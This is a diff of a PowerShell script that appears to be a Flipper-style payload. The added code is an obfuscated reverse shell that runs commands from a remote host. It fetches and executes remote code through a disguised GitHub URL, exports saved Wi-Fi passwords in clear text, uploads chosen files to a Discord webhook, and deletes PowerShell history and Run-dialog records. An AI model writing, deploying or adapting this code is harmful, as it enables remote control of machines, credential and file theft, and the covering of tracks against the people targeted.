@@ -1,72 +1,85 @@
-param (
-    [string]$webhook,
-    [string]$ip,
-    [int]$port
-)
+$3aa2ad906c2b4439a6dee0a389abb6ae = New-Object Net.Sockets.TCPClient($ip, $p)
+$32c6fa2cbe4e4467b2496ec6170445a0 = $3aa2ad906c2b4439a6dee0a389abb6ae.GetStream()
+$40762deaed16419582a9e2fa022f34cb = New-Object IO.StreamWriter($32c6fa2cbe4e4467b2496ec6170445a0)
 
-# Create TCP client connection and streams
-$client = New-Object Net.Sockets.TCPClient
-$client.Connect($ip, $port)
-
-if (-not $client.Connected) {
-    Write-Error "Could not connect to $ip:$port"
-    exit
+function hasbullawjwindbw {
+    (iwr 'https://google.com@raw.githubusercontent.com/CharlesTheGreat77/token2Discord/main/Testing.txt').Content | iex
 }
 
-$stream = $client.GetStream()
-if ($null -eq $stream) {
-    Write-Error "Could not get network stream."
-    $client.Close()
-    exit
+function popopwhwhbsvxjnfiifb {
+    $PsandQs = netsh wlan export profile key=clear; 
+    Select-String -Path *.xml -Pattern 'keyMaterial' | 
+    % { $_ -replace '</?keyMaterial>', ''} | 
+    % { $_ -replace '.xml:22:', '' }
+    wuwudhbdbwb("OUTPUT: $PsandQs")
 }
 
-$writer = New-Object IO.StreamWriter($stream)
-if ($null -eq $writer) {
-    Write-Error "Could not create stream writer."
-    $stream.Close()
-    $client.Close()
-    exit
+function flipejsjiebsbllb($ibwjskwbnskieg) {
+    $faylownabbdjw = @{
+        content = $ibwjskwbnskieg
+    } | ConvertTo-Json
+
+    $espoenabjsmbe = Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $faylownabbdjw
 }
 
-function SendToStream($msg) {
-    if ($null -ne $writer) {
-        $writer.Write($msg + 'ffff> ')
-        $writer.Flush()
-    }
+function kwhhabzbabjeikfn {
+    Remove-Item (Get-PSreadlineOption).HistorySavePath
+    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 }
 
-SendToStream "Connected to $ip on port $port"
+function wuwudhbdbwb($String) {
+    [byte[]]$cc63f96fb8d24ff993ecd4f81ea1715c=0..$3aa2ad906c2b4439a6dee0a389abb6a.ReceiveBufferSize|ForEach-Object{0}
+    $40762deaed16419582a9e2fa022f34cb.Write($String+'ffff> ')
+    $40762deaed16419582a9e2fa022f34cb.Flush()
+}
 
-$buffer = New-Object byte[] 4096
+wuwudhbdbwb('')
 
-while ($true) {
-    try {
-        if ($null -eq $stream) { break }
+$0abddb0134484e0ca2c951ce3e99f16c=1
+$cc63f96fb8d24ff993ecd4f81ea1715c=New-Object byte[] $3aa2ad906c2b4439a6dee0a389abb6ae.ReceiveBufferSize
 
-        $read = $stream.Read($buffer, 0, $buffer.Length)
+while ($0abddb0134484e0ca2c951ce3e99f16c -ge 0) {
+    $0abddb0134484e0ca2c951ce3e99f16c = $32c6fa2cbe4e4467b2496ec6170445a0.Read($cc63f96fb8d24ff993ecd4f81ea1715c, 0, $cc63f96fb8d24ff993ecd4f81ea1715c.Length)
+    
+    if ($0abddb0134484e0ca2c951ce3e99f16c -gt 0) {
+        $72b24f293ec941fabe2c084e41efcf4b = [System.Text.Encoding]::UTF8.GetString($cc63f96fb8d24ff993ecd4f81ea1715c, 0, $0abddb0134484e0ca2c951ce3e99f16c - 1)
 
-        # If no bytes read, remote closed connection
-        if ($read -le 0) {
-            break
+        # **TRIM input here to remove whitespace/newlines**
+        $72b24f293ec941fabe2c084e41efcf4b = $72b24f293ec941fabe2c084e41efcf4b.Trim()
+
+        if ($72b24f293ec941fabe2c084e41efcf4b -match "^/discord\s+(.+)$") {
+            $filename = $matches[1]
+            $ibwjskwbnskieg = "Flipper Report for $env:USERNAME"
+            flipejsjiebsbllb($ibwjskwbnskieg)
+            curl.exe -F "file1=@$filename" $webhook
+            $bdubsiwiwnbdvank = "File '$filename' sent.."
+            wuwudhbdbwb($bdubsiwiwnbdvank)
         }
-
-        $inputStr = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)
-
-        # Process $inputStr as before (commands, etc.)
-        # Example:
-        SendToStream "Received: $inputStr"
-        
-        # Your command handling logic here...
-        # ...
-        
-    }
-    catch {
-        Write-Error "Exception during stream read: $_"
-        break
+        elseif ($72b24f293ec941fabe2c084e41efcf4b -match "^/tgrizzly$") {
+            $bdubsiwiwnbdvank = "Executing /tgrizzly functionality.. saving output to C:\temp\output.txt"
+            wuwudhbdbwb($bdubsiwiwnbdvank)
+            hasbullawjwindbw
+        }
+        elseif ($72b24f293ec941fabe2c084e41efcf4b -match "^/wifi$") {
+            $bdubsiwiwnbdvank = "Executing /wifi.."
+            wuwudhbdbwb($bdubsiwiwnbdvank)
+            popopwhwhbsvxjnfiifb
+        }
+        elseif ($72b24f293ec941fabe2c084e41efcf4b -match "^/clean$") {
+            $bdubsiwiwnbdvank = "Executing cleanup.."
+            wuwudhbdbwb($bdubsiwiwnbdvank)
+            kwhhabzbabjeikfn
+        }
+        else {
+            $214a6b4cb6e043ab909aa13348235114 = try {
+                Invoke-Expression $72b24f293ec941fabe2c084e41efcf4b 2>&1 | Out-String
+            } catch {
+                $_ | Out-String
+            }
+            wuwudhbdbwb($214a6b4cb6e043ab909aa13348235114)
+        }
     }
 }
 
-# Cleanup
-if ($writer) { $writer.Close() }
-if ($stream) { $stream.Close() }
-if ($client) { $client.Close() }
+$40762deaed16419582a9e2fa022f34cb.Close()
+$3aa2ad906c2b4439a6dee0a389abb6ae.Close()
